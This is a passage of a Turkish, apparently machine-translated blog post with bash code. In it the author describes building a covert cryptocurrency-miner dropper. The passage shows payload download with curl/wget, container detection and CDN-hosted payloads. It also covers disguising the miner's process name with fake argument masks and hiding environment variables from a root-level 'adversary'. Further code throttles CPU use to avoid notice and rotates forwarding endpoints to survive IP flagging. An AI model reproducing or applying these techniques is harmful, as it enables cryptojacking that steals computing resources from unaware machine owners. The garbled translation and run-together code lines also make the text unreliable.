        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>içinde olup olmadığını kontrol etmek<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> konteyner</a> ayrıca kullanışlıdır, ipuçları için dosya sistemini inceleyebiliriz<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>Şimdi payloadumuzu indirme zamanı, hem wget hem de curl'ü desteklemeyi seçiyoruz, wget'i dikkatli bayraklarla nasıl kullanacağımızı zaten biliyoruz, curl için biraz farklı. Bir yapılandırma dosyası oluşturmalı ve geçersiz kılmalıyız<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>Son adım sadece yükü çıkarmaktır<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Yüke hizmet vermek için bir [CDN] kullanımından bahsetmeye değer. Burada yine cloudflare kurtarmaya geliyor, bizi bant genişliği harcamalarından kurtarıyor. Sıkıştırılmış yükümüzü bir a ile yeniden adlandırarak<em> Dosya uzantısı</em> cloudflare tarafından desteklenir... önbelleğe alınır. Cloudflare, hizmet verdiği şeyin başlıklarını kontrol etmez, belki de bu ölçekte bunu yapmak pratik değildir.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Bashland aşağı maceraları</a></h2><p>Bash, taşınabilir olduğu, çok yersiz görünmediği ve Perl, Ruby veya python gibi diğer betik dillerine kıyasla daha yaygın olduğu varsayımıyla seçildi. Gerçek şu ki, golang veya lua ile yazılmış bağımsız bir ikili dosya, daha az hatayla ve bakımı daha kolay olurdu, temelde bash mümkün olan en kötü seçimdi, savunmamda, bash ile bu kadar çok kaşıntıyı kaşıdığımda. , yeniden yazmak için çok geçti ve aynı zamanda sıkıcı olmaya başladı.<p>Tüm yerleşikleri (grep ve sed gibi) kullanmak için derleme zamanı bayrağıyla meşgul kutusu kullanma seçeneği de vardı, ancak yerleşikleri bu şekilde kullanmak işlerin (çatal) ortaya çıkmasına izin vermez ve arka plan programını potansiyel kilitlenmelere maruz bırakır.<p>Bazı bash işlevlerini burada tam listeyle birlikte açıklayacağım.<a href=\assets/posts/bash_functions.txt> Burada</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Kullan<code>RANDOM</code> bir karakter koduna karşılık gelen 97-122 arasında bir sayı elde etmek için değişken, printf yerleşik olmalıdır, bir döngü içinde çatallanmak istemiyoruz.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Anonim dosya tanımlayıcıları oluşturmak için borulardan yararlanın, bunlar tam olarak dosya tanımlayıcıları gibi davranmazlar, ancak bunlar için yeterince iyidirler.<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Çatallanma olmadan uyku, okuma yerleşikinin zaman aşımı işlevini kötüye kullanarak, özel bir dosya tanımlayıcı kullanır ve sonlandırmayı önlemek için kullanılabilir olduğundan emin olmalıyız.<p>gibi fonksiyonlar var<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> sistem kullanımını izlemek için kullanılır, bunların hepsi linux'u kullanır<code>/proc</code> gibi araçlar olmadan dosyalar<code>ps</code> , yani çatallama yok, hepsi saf bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Coprocesses bash'den beri mevcuttur<code>v4</code> , bir adları ve kendi dosya tanımlayıcıları olması dışında işler gibidirler.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Uzun ömürlü bir süreç olan bir arka plan programı yazıyoruz ve birçok dosya tanımlayıcı kullanıyoruz,<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> sınırlar</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Bu işlev şunlara bağlıdır:<a href=https://ipinfo.io/> ipinfo</a> Bölgeye bağlı bazı mantığın ayarlanmasına izin veren çalışanın bölgesini belirlemek,<a href=\assets/posts/geoip.json> geoip.json</a> ülkeleri bölgelere ayırıyoruz, çünkü biz üst düzey bölgeyi istiyoruz ve belirli bir ülkeyle ilgilenmiyoruz.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash, üzerinde bir soyutlama yaparak tcp bağlantılarını destekler.<code>/dev/tcp</code> (ayrıca udp için, ancak çoğu genellikle derleme sırasında devre dışı bırakılmış gibi görünüyor, bu yüzden ona güvenemezsiniz). Bu dosyalar bir bash dosyasıdır, linux'un bir parçası değildirler.<code>/dev</code> ağaç.<p>Bash işleri arasındaki eşzamanlılığı işlemek için bir kilitleme sisteminden de bahsetmeye değer. Birden fazla işin kilitlerle çalışmasına izin vermek için hepsinin bir dosya tanımlayıcıyı paylaşması gerekir, bu nedenle<code>locker</code> Kilidi kullanmak isteyen diğer işlerden önce, aynı zamanda bir iştir. Dolap sadece okur<code>stdin</code> kilitleme isteklerini bekliyor, yanıt veriyor<code>stdout</code> bir değişkende depolanan mevcut boole durumuna bağlı olarak. Bu yaklaşımın yarışsız olduğunu garanti etmiyorum, ancak düzgün bir şekilde çalışıyor gibi görünüyor, diğer yandan, dosya tanımlayıcılarının çok güvenilir olmadığını buldum, çünkü aşağılarda bir yerde temizlenmeyen bazı arabellekler olduğundan şüpheleniyorum.<em> borular</em> ve sonunda kilitlenmelere (bu, dolabın size her zaman bir cevap vermesine güvenemeyeceğiniz anlamına gelir).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Çöplerinizi temizleyin... karmaşık bash programları birçok değişken kullanır ve küresel alanı kötüye kullanırsanız şişkinleşir. Kabuk işleri üretiyorsanız, tüm ortamı devralırlar (etkili bir şekilde çoğaltılır, paylaşılmaz), hızlı bir şekilde bash yeme ile sonuçlanabilirsiniz.<code>100M</code> hafıza, hoş değil. Ayrıca gerçekten düşük profilli olmak istiyoruz. Dağıtım senaryomuzda, düşman<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> potansiyel olarak kök erişimine ve süreçlerimiz hakkında eksiksiz bilgiye sahip olabilir<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , ve bilirsiniz... her işlem, onu başlatan tam komut ve dışa aktarılan ortam değişkenleri hakkında bilgi içerir.<h2 id=configuration><a class=header-anchor href=#configuration> Yapılandırma</a></h2><p>Ortamımıza ve araçlarımıza sahip olduktan sonra, madencimizi üzerinde çalıştığı makine için yapılandırma adımlarını sözde kodda ayarlamamız gerekir:<ul><li><p>madenci için işlem adı<li><p>ana bilgisayar bilgileri (ram/çekirdekler/önbellekler/<code>ENV_VARS</code>)<li><p>yapılandırma sürümü<li><p><code>worker_id</code> madenci için (ip ve ana bilgisayardan)<li><p>bağlantı için ip/port</ul><p>İşlem için bir ad seçmek için gereklidir<em> saklamak</em> bir madenci çalıştırdığımız gerçeği, ancak sadece ikili dosyamızı yeniden adlandırmıyoruz, bir listemiz var<strong> maskeler</strong> potansiyel adaylar için (her satırın bir maske olduğu düz metin dosyası):<ul><li><p>rastgele bir maske seç<li><p>çeşitli bir işlem komutu almak için dizenin kuyruğundaki öğeleri (ilk hariç tümü) karıştırın. Şimdi şuna benzeyen bir dizimiz var<code>cmd --arg2 --arg1 --arg3</code> . Bu bizim madenci maskemiz, ikiliyi çalıştırıyoruz<em> olmadan</em> argümanlar, ancak bir komut başlattık gibi görünüyor<code>cmd</code> argümanlarla<code>--arg1 --arg2 --arg3</code> . Dosya adlarında boşluklara ve kısa çizgilere izin verilir, bu nedenle böyle adlandırılmış bir ikili dosya çalıştırmak iyidir, linux, işlem komutlarını depolarken yürütülebilir dosya ile argümanlar arasında ayrım yapmıyor gibi görünüyor.<p>Madenci yapılandırması otomatik olarak şuradan yüklenir:<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hash oranı</a></h3><p>, zamanla, yukarı akışlı madenci birçok<strong> otomatik ayar</strong> özellikler, bu yüzden komut dosyalarımın bir bölümünü gereksiz hale getirdi, ancak burada yukarı akış ve aşağı akış arasındaki fark, yukarı akış hedefinin en üst düzeye çıkarmak olmasıdır.<em> verim</em> , amacımız maksimize etmek iken<em> verimlilik ve şaşırtma</em> , sistemi sollamak istemiyoruz, servis kesintisi olmadan biraz sülük yapmak istiyoruz.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Bunun için çevre hakkında daha ayrıntılı bir anlayışa ihtiyacımız var.<code>l2/l3</code> işlemci, ram ve çekirdeklerin önbellek yapısı ve mevcut işlemci<em> ortalama</em> yük ve işlemci<em> kullanım</em>. bir inşa etmeye çalıştım<a href=https://en.wikipedia.org/wiki/Finite-state_machine> durum makinesi</a> minimumdan başlayacak ve yavaş yavaş ortalama en iyiye yerleşen farklı konfigürasyonları deneyecek olan bash'de. bir<strong> Kocaman</strong> boşa harcanan çabalar<a href=https://en.wikipedia.org/wiki/Technical_debt> teknik borç</a> bu çok hızlı bir şekilde iflas etti ve çoğunlukla kod tabanında kalan kalıntılarla birlikte atıldı.<p>Tüm bu otomatik ayarlama jumbolarını kırın, madenciyi ana bilgisayar kullanımına/yüküne bağlı olarak uyuttuk, bu gerekli madenci değişiklikleri<code>sleep</code> iş parçacığı verimleri arasında ve yapılandırma bekçi köpeğinde birkaç düzeltme<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , bu da uyku miktarını çalışma zamanında yeniden yüklememize izin verir. Mantık çok daha basitleştirilmiştir ve şöyle görünür:<ul><li><p>kullanım $TARGET_USAGE (± hata payı) üzerinde/altındaysa uykuyu artırın/azaltın<li><p>içindeki ortalama yük ise<code>1m</code> $TARGET_LOAD'ın üstünde/altında madenciliği duraklat/devam ettir</ul><h3 id=connection><a class=header-anchor href=#connection> Bağlantı</a></h3><p>Bash özetimizde bağlantı için yardımcı programları gösterdik. Bunlara neden ihtiyacımız var? Çünkü çeşitliliğe ihtiyacımız var; Bir şey şüpheli göründüğünde ve ağ etkinliği olduğunda, IP'ler işaretlendiğinde, bir uç noktayı yapılandırmaya kodlamak uzun sürmez.<p>Başlangıçta birkaç yöntem denedik:<ul><li><p>kullanarak<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proxy zincirleri</a> madenci ağı çağrılarını aşırı yüklemek için, ancak madencinin dinamik kitaplıklarla oluşturulması gerekiyordu ve bunları yük ile birlikte göndermeniz gerekiyordu, bu yüzden pratik değildi.<li><p>koşmak<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> ileri tünel</a> madenciyle yan yana: Bu, çok fazla yapılandırma yüküne sahipti, çünkü artık her dağıtımda daha fazla hataya yol açan iki işlem yapılandırıyorduk.</ul><p>Sonunda, bir bash değişkeninde saklanan ve rastgele bir tane seçerek bir uç nokta listesi göndermeye karar verdik. Bağlantılar elbette şifreliydi. Bu uç noktalar nelerdir? Madencilerin işlerini halledecek olan proxy'ye ileticiler.</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>neden ihtiyacımız var<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> madencilik proxy'si</a> ? ~100 eşzamanlı bağlantıyı gerçekten hiç geçmedim, bu nedenle ağ yükü için bir proxy gerçekten gerekli değildi, ancak karma algoritma üzerinde anlaşmak ve madencilerin üzerinde çalışmasını önlemek için farklı madencilere farklı zorluk hedefleri sağlamak için uygundu.<strong> zorluk</strong> tamamlamaları çok fazla zaman alacak ve bitmemiş işlerde hesaplamayı boşa harcama riskinden kaçınacak hedefler.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Havuz yazılımı ayrıca, düz http isteklerinde bir proxy olmak için mutlu bir şekilde reklam verdiği için birkaç değişiklik gerektirdi...<em> zaman aşımına uğraması gerekiyordu</em> ve bir çatal erişim kontrolü ekledi, böylece modlarımızı buna dayandırdık.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> json'u düzenleme</a></h3><p>Sadece bash ile bir json dosyasına değişiklik uygulamak, bazı env var ikameleri ve bazı regex ile elde ettik. Başlangıçta bir şeye güveniyorduk.<code>envsubst</code> değişkenleri uygulamak için ikili, sonra tam bash gittik<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> bu mantıkla:<ul><li><p>yapılandırma şablonunu oku<li><p>tüm alıntıları çok ezoterik bir dizeyle değiştirin (gibi<code>_#_#</code>)<li><p><code>eval</code> şablon<li><p>tüm ezoterik olayları tırnak işaretleri ile değiştirin</ul><p>Alt süreçlerden kaçınmanın yanı sıra, bir başka avantaj da şablonlarımızda eksiksiz bash yetenekleri elde etmemizdir. Şablonlar olmadan okumak ve yazmak için bash normal ifade yeteneklerine güvenmemiz gerekir:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
